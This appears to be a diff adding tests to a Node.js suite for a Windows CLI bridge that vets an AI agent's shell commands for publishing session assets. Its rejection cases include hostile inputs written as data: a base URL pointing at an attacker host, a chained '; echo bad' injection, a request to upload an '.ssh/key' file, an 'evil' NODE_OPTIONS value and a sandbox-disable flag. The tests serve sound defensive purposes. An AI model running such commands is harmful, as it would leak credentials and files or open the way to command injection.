@@ -1,5 +1,8 @@
 import assert from 'node:assert/strict';
-import { buildWindowsCliReadBridge } from '../chat/windows-cli-read-bridge.mjs';
+import { buildWindowsCliAssetBridge, buildWindowsCliReadBridge } from '../chat/windows-cli-read-bridge.mjs';
+import { mkdtemp, mkdir, rm, writeFile } from 'node:fs/promises';
+import os from 'node:os';
+import path from 'node:path';
 
 if (process.platform !== 'win32') { console.log('windows-cli-read-bridge: skipped (requires Windows)'); process.exit(0); }
 const state = { turnActive: true, riskContextValid: true, sessionControlReadAvailable: true, sessionControlReadRunId: 'fixture-run', riskMode: 'recommended',
@@ -46,4 +49,41 @@ const privileged = request('agentoc trigger list'); privileged.params.additional
 assert.equal(await buildWindowsCliReadBridge({ approval: privileged, state, helperPath, port: 7690, runId: 'fixture-run' }, { inspect }), null);
 const escape = request('agentoc trigger list'); escape.params.input.dangerouslyDisableSandbox = true;
 assert.equal(await buildWindowsCliReadBridge({ approval: escape, state, helperPath, port: 7690, runId: 'fixture-run' }, { inspect }), null);
+const fixtureRoot = await mkdtemp(path.join(os.tmpdir(), 'agentoc-asset-bridge-'));
+try {
+  const file = path.join(fixtureRoot, 'fixture.txt'); await writeFile(file, 'fixture');
+  const workspace = path.join(fixtureRoot, 'workspace'); await mkdir(workspace);
+  await mkdir(path.join(fixtureRoot, '.ssh')); await writeFile(path.join(fixtureRoot, '.ssh', 'key'), 'fixture');
+  const assetState = { ...state, cwd: workspace, riskContext: { platform: 'win32', cwd: workspace, trustedWorkspaceRoot: workspace, protectedRoots: [] } };
+  const assetRequest = command => ({ providerMethod: 'can_use_tool', params: { tool_name: 'Bash', input: { command } } });
+  const route = '"/api/sessions/$AGENTOC_SESSION_ID/assets"';
+  const body = JSON.stringify({ localPath: file, mimeType: 'text/plain', originalName: 'fixture.txt', text: 'fixture' });
+  const asset = (command, overrides = {}) => buildWindowsCliAssetBridge({ approval: assetRequest(command), state: assetState, helperPath, port: 7690, runId: 'fixture-run', ...overrides }, { inspect });
+  for (const riskMode of ['recommended', 'full-auto']) for (const prefix of ['agentoc', 'node "$AGENTOC_PROJECT_ROOT/cli.js"', 'MSYS_NO_PATHCONV=1 node "$AGENTOC_PROJECT_ROOT/cli.js"']) {
+    const result = await asset(`${prefix} api POST ${route} --body '${body}'`, { state: { ...assetState, riskMode } });
+    assert.ok(result?.updatedCommand.includes(' asset-publish '), `${riskMode}: ${prefix}`);
+    assert.deepEqual(JSON.parse(Buffer.from(result.updatedCommand.match(/'([A-Za-z0-9_-]+)'$/)[1], 'base64url').toString()), JSON.parse(body));
+  }
+  for (const command of [
+    `agentoc api POST "/api/sessions/other/assets" --body '${body}'`,
+    `agentoc api POST '__SESSION_ASSETS__' --body '${body}'`,
+    `agentoc api POST "/api/sessions/\${AGENTOC_SESSION_ID/assets" --body '${body}'`,
+    `agentoc api POST ${route} --body '${body}' --base-url http://attacker`,
+    `agentoc api POST ${route} --body '${body}' ; echo bad`,
+    `agentoc api POST ${route} --body '${JSON.stringify({ localPath: path.join(fixtureRoot, '.ssh', 'key') })}'`,
+    `agentoc api POST ${route} --body '${JSON.stringify({ localPath: file, extra: 'bad' })}'`,
+    `agentoc api POST ${route} --body '${JSON.stringify({ localPath: 'relative.txt' })}'`,
+    `agentoc api POST ${route} --body '${JSON.stringify({ localPath: path.join(fixtureRoot, 'missing.txt') })}'`,
+    `agentoc api POST ${route} --body '${JSON.stringify({ localPath: file, renderAs: 'html' })}'`,
+    `agentoc api DELETE ${route} --body '${body}'`,
+    `agentoc api POST ${route} --body-file '${file}'`,
+    `agentoc api POST ${route} --body '${body}' > output.txt`,
+    `NODE_OPTIONS=evil node "$AGENTOC_PROJECT_ROOT/cli.js" api POST ${route} --body '${body}'`,
+  ]) assert.equal(await asset(command), null, command);
+  assert.equal(await asset(`agentoc api POST ${route} --body '${body}'`, { state: { ...assetState, sessionControlReadAvailable: false } }), null);
+  assert.equal(await asset(`agentoc api POST ${route} --body '${body}'`, { state: { ...assetState, interactionMode: 'plan' } }), null);
+  assert.equal(await asset(`agentoc api POST ${route} --body '${body}'`, { runId: 'another-run' }), null);
+  const network = assetRequest(`agentoc api POST ${route} --body '${body}'`); network.params.additionalPermissions = { network: true };
+  assert.equal(await buildWindowsCliAssetBridge({ approval: network, state: assetState, helperPath, port: 7690, runId: 'fixture-run' }, { inspect }), null);
+} finally { await rm(fixtureRoot, { recursive: true, force: true }); }
 console.log('windows-cli-read-bridge: native AST and policy boundary checks passed');
